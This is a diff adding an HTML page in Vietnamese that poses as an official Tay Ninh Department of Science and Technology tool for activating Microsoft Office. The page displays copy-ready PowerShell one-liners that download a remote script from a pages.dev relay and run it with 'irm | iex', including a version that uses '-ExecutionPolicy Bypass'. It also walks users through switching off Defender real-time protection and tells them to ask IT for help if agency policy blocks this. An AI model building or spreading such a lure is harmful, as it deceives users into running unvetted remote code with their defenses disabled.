@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chạy Script PowerShell - Sở KH&CN Tây Ninh</title>
+    <style>
+        :root {
+            --bg-color: #0d1117;
+            --card-bg: #161b22;
+            --card-border: #30363d;
+            --text-main: #f0f6fc;
+            --text-muted: #8b949e;
+            --primary: #2f81f7;
+            --primary-hover: #58a6ff;
+            --success: #238636;
+            --success-hover: #2ea043;
+            --code-bg: #090d13;
+            --code-color: #79c0ff;
+            --accent: #d29922;
+            --danger-bg: rgba(239, 68, 68, 0.1);
+            --danger-border: rgba(239, 68, 68, 0.4);
+            --danger-text: #ff7b72;
+            --radius: 10px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px 16px;
+            line-height: 1.5;
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 760px;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(47, 129, 247, 0.15);
+            color: var(--primary-hover);
+            border: 1px solid rgba(47, 129, 247, 0.3);
+            padding: 4px 12px;
+            border-radius: 999px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            margin-bottom: 12px;
+        }
+
+        .badge-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #3fb950;
+            border-radius: 50%;
+            box-shadow: 0 0 8px #3fb950;
+        }
+
+        h1 {
+            font-size: 1.75rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            color: #ffffff;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+        }
+
+        /* Defender Alert Box */
+        .defender-alert {
+            background: linear-gradient(145deg, rgba(239, 68, 68, 0.12) 0%, rgba(22, 27, 34, 0.95) 100%);
+            border: 1px solid var(--danger-border);
+            border-left: 4px solid #ef4444;
+            border-radius: var(--radius);
+            padding: 16px 20px;
+            margin-bottom: 22px;
+            box-shadow: 0 4px 20px rgba(239, 68, 68, 0.15);
+        }
+
+        .defender-header {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .defender-icon {
+            width: 34px;
+            height: 34px;
+            background: rgba(239, 68, 68, 0.2);
+            color: #f85149;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .defender-icon svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .defender-header h3 {
+            font-size: 1.02rem;
+            font-weight: 700;
+            color: #ff7b72;
+            margin-bottom: 3px;
+        }
+
+        .defender-header p {
+            font-size: 0.88rem;
+            color: #c9d1d9;
+        }
+
+        .defender-steps {
+            background: rgba(0, 0, 0, 0.25);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            border-radius: 8px;
+            padding: 12px 14px;
+            margin-bottom: 12px;
+            font-size: 0.88rem;
+            color: #e6edf3;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .defender-step-item {
+            display: flex;
+            gap: 8px;
+            align-items: baseline;
+        }
+
+        .defender-step-tag {
+            color: #f85149;
+            font-weight: 700;
+            font-size: 0.82rem;
+            white-space: nowrap;
+        }
+
+        .defender-it-callout {
+            background: rgba(239, 68, 68, 0.18);
+            border: 1px dashed rgba(248, 81, 73, 0.6);
+            border-radius: 8px;
+            padding: 10px 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.9rem;
+            color: #ffa198;
+            font-weight: 500;
+        }
+
+        .defender-it-callout svg {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+            color: #f85149;
+        }
+
+        .defender-it-callout strong {
+            color: #ffffff;
+            text-decoration: underline;
+        }
+
+        /* Card Container */
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: var(--radius);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+            overflow: hidden;
+            margin-bottom: 22px;
+        }
+
+        /* Tab Switcher */
+        .tabs {
+            display: flex;
+            background: rgba(0, 0, 0, 0.25);
+            border-bottom: 1px solid var(--card-border);
+            padding: 6px 8px 0;
+            gap: 4px;
+            overflow-x: auto;
+        }
+
+        .tab-btn {
+            background: transparent;
+            border: none;
+            color: var(--text-muted);
+            padding: 8px 14px;
+            font-size: 0.88rem;
+            font-weight: 500;
+            border-radius: 6px 6px 0 0;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            white-space: nowrap;
+        }
+
+        .tab-btn:hover {
+            color: var(--text-main);
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .tab-btn.active {
+            color: #ffffff;
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-bottom-color: var(--card-bg);
+            position: relative;
+            top: 1px;
+        }
+
+        /* Command Box */
+        .command-container {
+            padding: 16px;
+            position: relative;
+        }
+
+        .code-box {
+            background: var(--code-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 8px;
+            padding: 14px 16px;
+            padding-right: 130px;
+            font-family: "Cascadia Code", "Fira Code", Consolas, monospace;
+            font-size: 0.92rem;
+            color: var(--code-color);
+            word-break: break-all;
+            white-space: pre-wrap;
+            cursor: pointer;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            user-select: all;
+            min-height: 52px;
+            display: flex;
+            align-items: center;
+        }
+
+        .code-box:hover {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 1px var(--primary);
+        }
+
+        .copy-btn {
+            position: absolute;
+            right: 24px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: var(--primary);
+            color: #ffffff;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
+        }
+
+        .copy-btn:hover {
+            background: var(--primary-hover);
+            transform: translateY(-50%) scale(1.02);
+        }
+
+        .copy-btn.copied {
+            background: var(--success);
+            color: #ffffff;
+        }
+
+        .copy-btn svg {
+            width: 16px;
+            height: 16px;
+            stroke-width: 2;
+        }
+
+        /* Step instructions */
+        .steps {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: var(--radius);
+            padding: 20px;
+            margin-bottom: 22px;
+        }
+
+        .steps h2 {
+            font-size: 1.05rem;
+            color: #ffffff;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .step-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .step-item {
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+        }
+
+        .step-number {
+            width: 26px;
+            height: 26px;
+            background: rgba(47, 129, 247, 0.2);
+            color: var(--primary-hover);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.85rem;
+            font-weight: 700;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .step-content {
+            font-size: 0.92rem;
+            color: var(--text-main);
+        }
+
+        kbd {
+            background-color: #21262d;
+            border: 1px solid #484f58;
+            border-bottom: 2px solid #484f58;
+            color: #e6edf3;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.82rem;
+            font-family: inherit;
+        }
+
+        /* Tips & Note */
+        .note {
+            background: rgba(210, 153, 34, 0.1);
+            border: 1px solid rgba(210, 153, 34, 0.25);
+            border-radius: var(--radius);
+            padding: 14px 16px;
+            font-size: 0.88rem;
+            color: #e3b341;
+            display: flex;
+            gap: 10px;
+            align-items: flex-start;
+        }
+
+        .note svg {
+            width: 18px;
+            height: 18px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        /* Toast notification */
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: #238636;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            opacity: 0;
+            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            pointer-events: none;
+            z-index: 1000;
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 0.82rem;
+            margin-top: 8px;
+        }
+
+        @media (max-width: 600px) {
+            .code-box {
+                padding-right: 16px;
+                padding-bottom: 50px;
+            }
+            .copy-btn {
+                right: 24px;
+                top: auto;
+                bottom: 24px;
+                transform: none;
+            }
+            .copy-btn:hover {
+                transform: scale(1.02);
+            }
+            h1 {
+                font-size: 1.4rem;
+            }
+            .defender-header {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="wrapper">
+        <!-- Header -->
+        <div class="header">
+            <div class="badge">
+                <span class="badge-dot"></span>
+                <span>Sở KH&CN Tây Ninh • Công Cụ Trực Tuyến</span>
+            </div>
+            <h1>Chạy Script Cài Đặt & Kích Hoạt Office</h1>
+            <p class="subtitle">Sao chép dòng lệnh bên dưới và dán vào PowerShell để khởi chạy công cụ.</p>
+        </div>
+
+        <!-- Defender Warning Notice -->
+        <div class="defender-alert">
+            <div class="defender-header">
+                <div class="defender-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+                </div>
+                <div>
+                    <h3>THÔNG BÁO QUAN TRỌNG: MICROSOFT DEFENDER CHẶN THỰC THI</h3>
+                    <p>Nếu quá trình chạy bị dừng hoặc báo lỗi đỏ do Microsoft Defender / Antivirus chặn lệnh tải:</p>
+                </div>
+            </div>
+
+            <div class="defender-steps">
+                <div class="defender-step-item">
+                    <span class="defender-step-tag">Bước 1:</span>
+                    <span>Mở <strong>Windows Security</strong> &rarr; chọn <strong>Virus & threat protection</strong>.</span>
+                </div>
+                <div class="defender-step-item">
+                    <span class="defender-step-tag">Bước 2:</span>
+                    <span>Tại mục <em>Virus & threat protection settings</em> &rarr; nhấn <strong>Manage settings</strong>.</span>
+                </div>
+                <div class="defender-step-item">
+                    <span class="defender-step-tag">Bước 3:</span>
+                    <span>Tạm thời chuyển <strong>Real-time protection</strong> sang <strong>OFF (Tắt)</strong>. Sau khi chạy kích hoạt xong, bạn có thể bật lại bình thường.</span>
+                </div>
+            </div>
+
+            <div class="defender-it-callout">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                <span><strong>Lưu ý:</strong> Nếu không tự tắt được Defender (do máy bị quản lý bởi chính sách cơ quan), <strong>vui lòng liên hệ ngay bộ phận IT</strong> để được hỗ trợ!</span>
+            </div>
+        </div>
+
+        <!-- Command Card -->
+        <div class="card">
+            <!-- Tabs -->
+            <div class="tabs">
+                <button class="tab-btn active" onclick="switchTab(0)">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+                    PowerShell (Khuyên dùng)
+                </button>
+                <button class="tab-btn" onclick="switchTab(1)">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="9" y1="9" x2="15" y2="15"></line><line x1="15" y1="9" x2="9" y2="15"></line></svg>
+                    Hộp thoại Run (Win + R)
+                </button>
+                <button class="tab-btn" onclick="switchTab(2)">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                    Lệnh Bypass Policy
+                </button>
+            </div>
+
+            <!-- Command Area -->
+            <div class="command-container">
+                <div class="code-box" id="codeDisplay" onclick="copyCurrentCommand()" title="Nhấp chuột vào đây để sao chép"></div>
+                <button class="copy-btn" id="copyBtn" onclick="copyCurrentCommand()">
+                    <span id="btnIcon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                    </span>
+                    <span id="btnText">Sao chép</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Steps Guide -->
+        <div class="steps">
+            <h2>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--primary)" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 14 14"></polyline></svg>
+                Các bước thực hiện nhanh:
+            </h2>
+            <ul class="step-list">
+                <li class="step-item">
+                    <div class="step-number">1</div>
+                    <div class="step-content">
+                        Nhấn nút <strong>Sao chép</strong> ở khung lệnh bên trên.
+                    </div>
+                </li>
+                <li class="step-item">
+                    <div class="step-number">2</div>
+                    <div class="step-content">
+                        Mở <strong>PowerShell</strong>: Nhấn chuột phải vào nút Start (hoặc bấm tổ hợp phím <kbd>Windows</kbd> + <kbd>X</kbd>) &rarr; Chọn <strong>Windows PowerShell</strong> hoặc <strong>Terminal</strong> (Khuyên dùng Run as Administrator).
+                    </div>
+                </li>
+                <li class="step-item">
+                    <div class="step-number">3</div>
+                    <div class="step-content">
+                        <strong>Dán lệnh</strong>: Nhấp chuột phải vào cửa sổ PowerShell (hoặc bấm <kbd>Ctrl</kbd> + <kbd>V</kbd>) &rarr; Nhấn phím <kbd>Enter</kbd> để chạy.
+                    </div>
+                </li>
+            </ul>
+        </div>
+
+        <!-- Note / Warning -->
+        <div class="note">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+            <div>
+                <strong>Lưu ý kết nối:</strong> Máy tính cần có kết nối mạng Internet để tải cấu hình an toàn từ Cloud Relay. Nếu hệ thống báo lỗi hạn chế quyền thực thi, vui lòng chuyển qua tab <em>"Lệnh Bypass Policy"</em>.
+            </div>
+        </div>
+
+        <div class="footer">
+            &copy; Sở Khoa học và Công nghệ Tây Ninh &bull; Secure Script Launcher
+        </div>
+    </div>
+
+    <!-- Notification Toast -->
+    <div class="toast" id="toast">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"></path></svg>
+        <span>Đã sao chép lệnh vào bộ nhớ tạm!</span>
+    </div>
+
+    <script>
+        const scriptUrl = "http://git-relay.pages.dev/_raw/CloudHoang/online-ODT/refs/heads/main/KHCNTayNinh_Office_Active_Secured.ps1";
+
+        // 3 command variations
+        const commands = [
+            `irm ${scriptUrl} | iex`,
+            `powershell -Command "irm ${scriptUrl} | iex"`,
+            `powershell -ExecutionPolicy Bypass -Command "irm ${scriptUrl} | iex"`
+        ];
+
+        let currentTabIndex = 0;
+
+        const codeDisplay = document.getElementById("codeDisplay");
+        const copyBtn = document.getElementById("copyBtn");
+        const btnIcon = document.getElementById("btnIcon");
+        const btnText = document.getElementById("btnText");
+        const toast = document.getElementById("toast");
+        const tabs = document.querySelectorAll(".tab-btn");
+
+        function renderCommand() {
+            codeDisplay.textContent = commands[currentTabIndex];
+        }
+
+        function switchTab(index) {
+            currentTabIndex = index;
+            tabs.forEach((tab, i) => {
+                if (i === index) {
+                    tab.classList.add("active");
+                } else {
+                    tab.classList.remove("active");
+                }
+            });
+            renderCommand();
+            resetCopyButton();
+        }
+
+        function resetCopyButton() {
+            copyBtn.classList.remove("copied");
+            btnText.textContent = "Sao chép";
+            btnIcon.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>`;
+        }
+
+        // Robust copy function supporting both modern navigator.clipboard and fallback execCommand
+        async function copyCurrentCommand() {
+            const textToCopy = commands[currentTabIndex];
+            let copied = false;
+
+            if (navigator.clipboard && window.isSecureContext) {
+                try {
+                    await navigator.clipboard.writeText(textToCopy);
+                    copied = true;
+                } catch (err) {
+                    copied = false;
+                }
+            }
+
+            if (!copied) {
+                // Fallback for non-https / file:// or older browsers
+                const textArea = document.createElement("textarea");
+                textArea.value = textToCopy;
+                textArea.style.position = "fixed";
+                textArea.style.left = "-9999px";
+                textArea.style.top = "-9999px";
+                document.body.appendChild(textArea);
+                textArea.focus();
+                textArea.select();
+                try {
+                    copied = document.execCommand("copy");
+                } catch (e) {
+                    copied = false;
+                }
+                document.body.removeChild(textArea);
+            }
+
+            if (copied) {
+                // Button state
+                copyBtn.classList.add("copied");
+                btnText.textContent = "Đã sao chép!";
+                btnIcon.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"></path></svg>`;
+
+                // Toast show
+                toast.classList.add("show");
+                setTimeout(() => {
+                    toast.classList.remove("show");
+                }, 2200);
+
+                setTimeout(() => {
+                    resetCopyButton();
+                }, 3000);
+            }
+        }
+
+        // Initialize display
+        renderCommand();
+    </script>
+</body>
+</html>
